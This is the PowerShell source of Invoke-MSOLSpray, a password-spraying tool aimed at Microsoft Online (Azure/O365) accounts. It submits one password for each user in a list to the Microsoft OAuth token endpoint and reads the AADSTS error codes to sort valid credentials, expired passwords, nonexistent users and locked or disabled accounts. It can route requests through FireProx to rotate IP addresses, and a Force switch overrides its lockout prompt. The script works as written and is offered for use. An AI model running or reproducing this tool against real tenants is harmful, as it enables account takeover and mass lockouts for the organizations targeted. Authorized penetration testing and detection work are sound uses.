# Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Invoke-MSOLSpray {
    <#
    .SYNOPSIS
        Performs password spraying against Microsoft Online accounts (Azure/O365). Logs valid credentials, tenant issues, non-existent users, locked accounts, or disabled accounts.
        Author: Beau Bullock (@dafthack)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION
        This module performs password spraying against Microsoft Online accounts (Azure/O365). It logs whether credentials are valid, if a tenant doesn't exist, if a user doesn't exist, if an account is locked, or if an account is disabled.

    .PARAMETER UserList
        File containing usernames (one per line) in the format "user@domain.com".

    .PARAMETER Password
        Single password to use for the password spray.

    .PARAMETER OutFile
        File to output valid results to.

    .PARAMETER Force
        Continues spraying even if multiple account lockouts are detected.

    .PARAMETER URL
        URL to spray against (e.g., for FireProx to randomize IP addresses).

    .EXAMPLE
        Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020
        Description: Sprays the provided userlist with the password "Winter2020".

    .EXAMPLE
        Invoke-MSOLSpray -UserList .\userlist.txt -Password P@ssword -URL https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox -OutFile valid-users.txt
        Description: Uses a FireProx URL for spraying and writes results to a file.
    #>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $False)]
        [string]$OutFile = "",

        [Parameter(Position = 1, Mandatory = $False)]
        [string]$UserList = "",

        [Parameter(Position = 2, Mandatory = $False)]
        [string]$Password = "",

        [Parameter(Position = 3, Mandatory = $False)]
        [string]$URL = "https://login.microsoft.com",

        [Parameter(Position = 4, Mandatory = $False)]
        [switch]$Force
    )

    # Input validation
    if (-not $UserList -or -not (Test-Path $UserList)) {
        Write-Host -ForegroundColor Red "[ERROR] UserList file not found or not specified. Please provide a valid file path."
        return
    }
    if (-not $Password) {
        Write-Host -ForegroundColor Red "[ERROR] Password parameter is required."
        return
    }

    # Initialize variables
    $ErrorActionPreference = 'SilentlyContinue'
    $Usernames = Get-Content $UserList
    $count = $Usernames.Count
    $curr_user = 0
    $lockout_count = 0
    $lockoutquestion = 0
    $fullresults = @()
    $summary = @{
        ValidCredentials = 0
        ExpiredPasswords = 0
        LockedAccounts = 0
        DisabledAccounts = 0
        InvalidUsers = 0
        InvalidTenants = 0
        UnknownErrors = 0
    }

    # Display welcome banner
    Write-Host -ForegroundColor Cyan "==============================================================="
    Write-Host -ForegroundColor Cyan "       MSOLSpray - Microsoft Online Password Spray"
    Write-Host -ForegroundColor Cyan "       Author: dafthack    |    Designed by: dGiri"
    Write-Host -ForegroundColor Cyan "==============================================================="
    Write-Host -ForegroundColor Yellow "[INFO] Starting password spray on $count users."
    Write-Host -ForegroundColor Yellow "[INFO] Target URL: $URL"
    Write-Host -ForegroundColor Yellow "[INFO] Password: $Password"
    Write-Host -ForegroundColor Yellow "[INFO] Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Write-Host -ForegroundColor Cyan "---------------------------------------------------------------"

    foreach ($username in $Usernames) {
        $curr_user++
        $percentComplete = [math]::Round(($curr_user / $count) * 100, 2)

        # Update progress bar
        Write-Progress -Activity "Password Spraying" -Status "Testing user $curr_user of $count ($percentComplete%)" -PercentComplete $percentComplete -CurrentOperation "User: $username"

        # Set up the web request
        $BodyParams = @{
            'resource'    = 'https://graph.windows.net'
            'client_id'   = '1b730954-1685-4b74-9bfd-dac224a7b894'
            'client_info' = '1'
            'grant_type'  = 'password'
            'username'    = $username
            'password'    = $Password
            'scope'       = 'openid'
        }
        $PostHeaders = @{
            'Accept'       = 'application/json'
            'Content-Type' = 'application/x-www-form-urlencoded'
        }
        $webrequest = Invoke-WebRequest -Uri "$URL/common/oauth2/token" -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr -UseBasicParsing

        # Process response
        if ($webrequest.StatusCode -eq 200) {
            Write-Host -ForegroundColor Green "[SUCCESS] $(Get-Date -Format 'HH:mm:ss') - Valid credentials: $username : $Password"
            $fullresults += "$username : $Password"
            $summary.ValidCredentials++
        }
        else {
            # Parse the response body for error details
            $responseBody = $null
            $errorCode = $null
            if ($webrequest.Content) {
                try {
                    $responseBody = $webrequest.Content | ConvertFrom-Json
                    $errorCode = $responseBody.error_description -match 'AADSTS\d+'
                    if ($errorCode) {
                        $errorCode = $Matches[0]
                    }
                } catch {
                    Write-Host -ForegroundColor Yellow "[WARNING] Failed to parse response body for $username."
                }
            }

            # Use error code from response body or RespErr
            if ($errorCode) {
                $errorToCheck = $errorCode
            } else {
                $errorToCheck = $RespErr
            }

            switch -Regex ($errorToCheck) {
                "AADSTS50126" {
                    # Invalid password, continue silently
                    continue
                }
                "AADSTS50128|AADSTS50059" {
                    Write-Host -ForegroundColor Magenta "[WARNING] $(Get-Date -Format 'HH:mm:ss') - Tenant for $username doesn't exist. Verify the domain."
                    $summary.InvalidTenants++
                }
                "AADSTS50034" {
                    Write-Host -ForegroundColor Magenta "[WARNING] $(Get-Date -Format 'HH:mm:ss') - User $username doesn't exist."
                    $summary.InvalidUsers++
                }
                "AADSTS50053" {
                    Write-Host -ForegroundColor Red "[ERROR] $(Get-Date -Format 'HH:mm:ss') - Account $username appears to be locked."
                    $lockout_count++
                    $summary.LockedAccounts++
                }
                "AADSTS50057" {
                    Write-Host -ForegroundColor Red "[ERROR] $(Get-Date -Format 'HH:mm:ss') - Account $username appears to be disabled."
                    $summary.DisabledAccounts++
                }
                "AADSTS50055" {
                    Write-Host -ForegroundColor Green "[SUCCESS] $(Get-Date -Format 'HH:mm:ss') - Valid credentials: $username : $Password (Password expired)"
                    $fullresults += "$username : $Password (Password expired)"
                    $summary.ExpiredPasswords++
                }
                default {
                    Write-Host -ForegroundColor Red "[ERROR] $(Get-Date -Format 'HH:mm:ss') - Unknown error for user $username : $errorToCheck"
                    Write-Host -ForegroundColor Yellow "[DEBUG] Response Body: $($webrequest.Content)"
                    $summary.UnknownErrors++
                }
            }
        }

        # Add delay to avoid rate limiting
        Start-Sleep -Milliseconds 500

        # Handle lockout threshold
        if (-not $Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0) {
            Write-Host -ForegroundColor Red "--------------------------------------------------"
            Write-Host -ForegroundColor Red "[ALERT] Multiple account lockouts detected (10 accounts)!"
            Write-Host -ForegroundColor Red "[WARNING] This may indicate Azure AD Smart Lockout is enabled."
            $title = "Continue Password Spray?"
            $message = "Do you want to continue the password spray despite multiple lockouts?"

            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", "Continue the password spray."
            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", "Cancel the password spray."
            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

            $result = $host.ui.PromptForChoice($title, $message, $options, 1)
            $lockoutquestion++
            if ($result -ne 0) {
                Write-Host -ForegroundColor Yellow "[INFO] Cancelling password spray."
                break
            }
        }
    }

    # Complete progress bar
    Write-Progress -Activity "Password Spraying" -Completed

    # Display summary as a formatted table
    Write-Host -ForegroundColor Cyan "---------------------------------------------------------------"
    Write-Host -ForegroundColor Cyan "          Password Spray Results Summary"
    Write-Host -ForegroundColor Cyan "---------------------------------------------------------------"
    Write-Host -ForegroundColor Yellow "[INFO] Total Users Tested: $count"
    Write-Host -ForegroundColor Yellow "[INFO] End Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    Write-Host -ForegroundColor Cyan "---------------------------------------------------------------"
    Write-Host -ForegroundColor Cyan "| Category                |   Count   | Percentage |"
    Write-Host -ForegroundColor Cyan "+-------------------------+-----------+------------+"
    Write-Host -ForegroundColor White "| Valid Credentials       | $($summary.ValidCredentials.ToString().PadLeft(9)) | $($([math]::Round(($summary.ValidCredentials / $count) * 100, 1)).ToString("0.0").PadLeft(4)) %$( ''.PadRight(4)) |"
    Write-Host -ForegroundColor White "| Expired Passwords       | $($summary.ExpiredPasswords.ToString().PadLeft(9)) | $($([math]::Round(($summary.ExpiredPasswords / $count) * 100, 1)).ToString("0.0").PadLeft(4)) %$( ''.PadRight(4)) |"
    Write-Host -ForegroundColor White "| Locked Accounts         | $($summary.LockedAccounts.ToString().PadLeft(9)) | $($([math]::Round(($summary.LockedAccounts / $count) * 100, 1)).ToString("0.0").PadLeft(4)) %$( ''.PadRight(4)) |"
    Write-Host -ForegroundColor White "| Disabled Accounts       | $($summary.DisabledAccounts.ToString().PadLeft(9)) | $($([math]::Round(($summary.DisabledAccounts / $count) * 100, 1)).ToString("0.0").PadLeft(4)) %$( ''.PadRight(4)) |"
    Write-Host -ForegroundColor White "| Invalid Users           | $($summary.InvalidUsers.ToString().PadLeft(9)) | $($([math]::Round(($summary.InvalidUsers / $count) * 100, 1)).ToString("0.0").PadLeft(4)) %$( ''.PadRight(4)) |"
    Write-Host -ForegroundColor White "| Invalid Tenants         | $($summary.InvalidTenants.ToString().PadLeft(9)) | $($([math]::Round(($summary.InvalidTenants / $count) * 100, 1)).ToString("0.0").PadLeft(4)) %$( ''.PadRight(4)) |"
    Write-Host -ForegroundColor White "| Unknown Errors          | $($summary.UnknownErrors.ToString().PadLeft(9)) | $($([math]::Round(($summary.UnknownErrors / $count) * 100, 1)).ToString("0.0").PadLeft(4)) %$( ''.PadRight(4)) |"
    Write-Host -ForegroundColor Cyan "+-------------------------+-----------+------------+"
    Write-Host -ForegroundColor Cyan "---------------------------------------------------------------"

    # Output to file
    if ($OutFile -ne "" -and $fullresults) {
        $fullresults | Out-File -Encoding ascii $OutFile
        Write-Host -ForegroundColor Yellow "[INFO] Results written to $OutFile"
    }
}